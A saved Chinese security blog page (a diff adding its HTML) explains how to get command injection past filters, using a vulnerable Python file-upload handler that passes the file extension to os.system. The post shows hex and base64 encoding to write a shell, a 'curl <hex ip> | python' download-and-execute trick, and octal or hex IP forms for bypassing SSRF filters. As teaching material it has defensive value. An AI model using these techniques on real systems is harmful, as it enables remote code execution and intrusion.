@@ -1,0 +1,210 @@
+
+<!DOCTYPE html>
+
+<html lang="zh-cn">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>小密圈专题(2)-命令执行绕过 - l3m0n - 博客园</title>
+<link href="./小密圈专题(2)-命令执行绕过 - l3m0n - 博客园/blog-common.cssv=m_FXmwz3wxZoecUwNEK23PAzc-j9vbX_C6MblJ5ouMc1" rel="stylesheet" type="text/css"/>
+<link href="./小密圈专题(2)-命令执行绕过 - l3m0n - 博客园/bundle-InsideDotNet.cssv=hm5Ncnf1UmSaS2roxKOjrIG9bKc-5gPzmHFjhD4ZWn01" id="MainCss" rel="stylesheet" type="text/css"/>
+<link href="./小密圈专题(2)-命令执行绕过 - l3m0n - 博客园/bundle-InsideDotNet-mobile.cssv=riNccSBaYfFlRjQw4oW6Q_6u5zO0NRZr85vSvhPWcl01" id="mobile-style" media="only screen and (max-width: 768px)" rel="stylesheet" type="text/css"/>
+<link href="./小密圈专题(2)-命令执行绕过 - l3m0n - 博客园/rss" rel="alternate" title="RSS" type="application/rss+xml"/>
+<link href="./小密圈专题(2)-命令执行绕过 - l3m0n - 博客园/rsd.xml" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+<link href="./小密圈专题(2)-命令执行绕过 - l3m0n - 博客园/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+<script src="./小密圈专题(2)-命令执行绕过 - l3m0n - 博客园/jquery.js" type="text/javascript"></script>
+<script type="text/javascript">var currentBlogApp = 'iamstudy', cb_enable_mathjax=true;var isLogined=false;</script>
+<script src="./小密圈专题(2)-命令执行绕过 - l3m0n - 博客园/blog-common.jsv=CPv0EEqm9L2aCgolHxaZfVYM6J-Sn5az_FJXbjzgr-o1" type="text/javascript"></script>
+</head>
+<body>
+<a name="top"></a>
+<!--done-->
+<div id="home">
+<div id="header">
+<div id="blogTitle">
+<div style="display:none"><img alt="谨以此模板祝贺【博客园开发者征途】系列图书《你必须知道的.net》出版发行" src="./小密圈专题(2)-命令执行绕过 - l3m0n - 博客园/top.gif"/></div>
+<a href="http://www.cnblogs.com/iamstudy/" id="lnkBlogLogo"><img alt="返回主页" id="blogLogo" src="./小密圈专题(2)-命令执行绕过 - l3m0n - 博客园/logo.gif"/></a>
+<!--done-->
+<h1><a class="headermaintitle" href="http://www.cnblogs.com/iamstudy/" id="Header1_HeaderTitle">l3m0n</a></h1>
+<h2></h2>
+</div><!--end: blogTitle 博客的标题和副标题 -->
+<div id="navigator">
+<ul id="navList">
+<li></li>
+<li><a class="menu" href="http://ing.cnblogs.com/" id="MyLinks1_SpaceLink">闪存</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/" id="blog_nav_myhome">首页</a></li>
+<li></li>
+<li></li>
+<li><a class="menu" href="https://i.cnblogs.com/" id="blog_nav_admin" rel="nofollow">管理</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss">订阅</a>
+<a class="aHeaderXML" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss_image"><img alt="订阅" src="./小密圈专题(2)-命令执行绕过 - l3m0n - 博客园/xml.gif"/></a></li>
+</ul>
+<div class="clear"></div>
+<div class="blogStats">
+<div id="blog_stats">
+<!--done-->
+随笔- 1 
+文章- 65 
+评论- 17 
+</div>
+</div><!--end: blogStats -->
+</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+<div id="main">
+<div id="mainContent">
+<div class="forFlow">
+<div id="post_detail">
+<!--done-->
+<div id="topics">
+<div class="post">
+<h1 class="postTitle">
+<a class="postTitle2" href="http://www.cnblogs.com/iamstudy/articles/command_exec_tips_1.html" id="cb_post_title_url">小密圈专题(2)-命令执行绕过</a>
+</h1>
+<div class="clear"></div>
+<div class="postBody">
+<div class="cnblogs-markdown" id="cnblogs_post_body"><p>心明表哥的一个提问，大概就是一个文件后缀名可命令执行，但是没法用<code>. / \</code>，不然会被误处理。</p>
+<pre><code>if file_src == "vpn_logo_upload":
+    data = request.files.vpn_logo
+    filename = data.filename
+    if data.file:
+        file_ext = os.path.splitext(filename)[1]
+        output_path = "/usr/vtm/var/www/html/vpn/upload/" + "vpn_logo" + file_ext
+        bak_tag = False
+        bak_file_path = output_path + ".bak"
+        if os.path.exists(output_path):
+            cmd = "mv -f " + output_path + " " + bak_file_path
+            os.system(cmd)
+            bak_tag = True
+        write_file(filename, data.file, output_path)
+        file_size = os.path.getsize(output_path)
+        file_type = mimetypes.guess_type(output_path)
+        del_cmd = "rm -f " + output_path
+        if file_type[0] != "image/jpeg" and file_type[0] != "image/png" and file_type[0] != "image/gif":
+            result = {"return": -2, "reason": file_type[0]}
+            os.system(del_cmd)
+        elif file_size &lt; file_size_1M:
+            result["data"]["new_name"] = "vpn_logo" + file_ext
+        else:
+            result = {"return": -2, "reason": "file is too large"}
+            os.system(del_cmd)
+            if bak_tag:
+                bak_cmd = "mv -f " + bak_file_path + " " + output_path
+                os.system(bak_cmd)</code></pre>
+<h2 id="编码">1. 编码</h2>
+<p>linux有一些编码工具,base64,16进制</p>
+<pre><code>base64,并不是很好用,因为base64有时候会出现`/`字符
+编码: echo "hello" | base64 
+解码: echo "aGVsbG8K" | base64 -d
+
+16进制
+编码: echo "hello" | xxd -p
+解码: echo "68656c6c6f0a" | xxd -r -p</code></pre>
+<p>优缺点: 存在字符长度问题，当然如果是无法连接外网的时候，这个还是能写shell的</p>
+<h2 id="远程下载执行">2.远程下载执行</h2>
+<p>不能存在<code>.</code>，所以<code>curl 16进制ip | python</code>，最好用flask或者其他的创建一个web服务吧，apache的话会出400错误，虽然理论可以自定义的.</p>
+<p>补充内容: 好像大家对16进制这个有点误解,这个在ssrf中绕过是经常使用的.</p>
+<pre><code>十进制 ---||||||&gt; 十六进制 ---||||||&gt; 八进制 然后在访问时 指定协议然后加个0
+
+http://0[八进制] 比如 115.239.210.26 首先用.分割数字 115 239 210 26 然后选择10进制转换16进制！
+
+(要用0来表示前缀，可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样！)
+
+首先把这四段数字给 转成 16 进制！结果：73 ef d2 1a  然后把 73efd21a 这十六进制一起转换成8进制！
+
+结果：16373751032
+
+然后指定协议 http:// 用0表示前缀 加上结果 链接：
+
+http://0016373751032</code></pre>
+<p><img src="./小密圈专题(2)-命令执行绕过 - l3m0n - 博客园/804631-20170403215141644-1825540387.png"/></p>
+<p>类似的栋栋师傅的姿势</p>
+<pre><code>用16进制比bash64更通用，再补充一个，很多时候可能会遇到没有写权限，常规思路可能是去找有写权限的目录，不过费时费力，下面这个技巧可能会更简单一些 ​​​​</code></pre>
+<p><img src="./小密圈专题(2)-命令执行绕过 - l3m0n - 博客园/804631-20170404122430847-825919247.jpg"/></p>
+</div><div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+<div id="BlogPostCategory"></div>
+<div id="EntryTag"></div>
+<div id="blog_post_info">
+</div>
+<div class="clear"></div>
+<div id="post_next_prev"></div>
+</div>
+</div>
+<div class="postDesc">posted @ <span id="post-date">2017-04-03 21:53</span> <a href="http://www.cnblogs.com/iamstudy/">l3m0n</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href="https://i.cnblogs.com/EditArticles.aspx?postid=6663757" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(6663757);return false;">收藏</a></div>
+</div>
+<script src="./小密圈专题(2)-命令执行绕过 - l3m0n - 博客园/highlight.min.jsid=20160127"></script><script>markdown_highlight();</script><script type="text/javascript">var allowComments=true,cb_blogId=242399,cb_entryId=6663757,cb_blogApp=currentBlogApp,cb_blogUserGuid='f80873d6-234e-e511-b908-9dcfd8948a71',cb_entryCreatedDate='2017/4/3 21:53:00';loadViewCount(cb_entryId);</script>
+</div><!--end: topics 文章、评论容器-->
+</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
+<div class="commentform" id="comment_form">
+<a name="commentform"></a>
+<div id="divCommentShow"></div>
+<div id="comment_nav"><span id="span_refresh_tips"></span><a clientidmode="Static" href="javascript:void(0);" id="lnk_RefreshComments" onclick="return RefreshCommentList();" runat="server">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+<div id="comment_form_container"></div>
+<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+<div id="ad_t2"></div>
+<div id="opt_under_post"></div>
+<div class="c_ad_block" id="cnblogs_c1"></div>
+<div id="under_post_news"></div>
+<div class="c_ad_block" id="cnblogs_c2"></div>
+<div id="under_post_kb"></div>
+<div class="c_ad_block" id="HistoryToday"></div>
+<script type="text/javascript">
+    fixPostBody();
+    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
+    deliverAdT2();
+    deliverAdC1();
+    deliverAdC2();    
+    loadNewsAndKb();
+    loadBlogSignature();
+    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
+    loadOptUnderPost();
+    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
+</script>
+</div>
+</div><!--end: forFlow -->
+</div><!--end: mainContent 主体内容容器-->
+<div id="sideBar">
+<div id="sideBarMain">
+<!--done-->
+<div class="newsItem">
+<h3 class="catListTitle">公告</h3>
+<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
+</div>
+<div id="calendar"><div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script></div>
+<div id="leftcontentcontainer">
+<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
+</div>
+</div><!--end: sideBarMain -->
+</div><!--end: sideBar 侧边栏容器 -->
+<div class="clear"></div>
+<div class="clear"></div>
+</div><!--end: main -->
+<div class="clear"></div>
+<div id="footer">
+<!--done-->
+Copyright ©2017 l3m0n 谨以此模板祝贺【博客园开发者征途】系列图书之《你必须知道的.NET》出版发行
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+<!--PageEndHtml Block Begin-->
+<div align="center" id="something">
+<script language="javascript" src="./小密圈专题(2)-命令执行绕过 - l3m0n - 博客园/18599866.js" type="text/javascript"></script>
+<noscript><a href="//www.51.la/?18599866" target="_blank"><img alt="我要啦免费统计" src="//img.users.51.la/18599866.asp" style="border:none"/></a></noscript>
+<script language="javascript" src="./小密圈专题(2)-命令执行绕过 - l3m0n - 博客园/id=18599866&amp;mb=3" type="text/javascript"></script>
+</div>
+<script>
+$('#footer').html('Copyright &copy;2017 Syclover-l3m0n');
+console.log('Hello,welcome to my blog!!!\n                  --------l3m0n');
+window.onload=function(){
+  $('#q').css({'width':'100px'});
+  $('#under_post_news').html('');
+  $('#under_post_kb').html('');
+  $('#ad_t2').html('');
+  $('#cnblogs_c1').html('');
+  $('#cnblogs_c2').html('');
+}
+</script>
+<!--PageEndHtml Block End-->
+</body>
+</html>
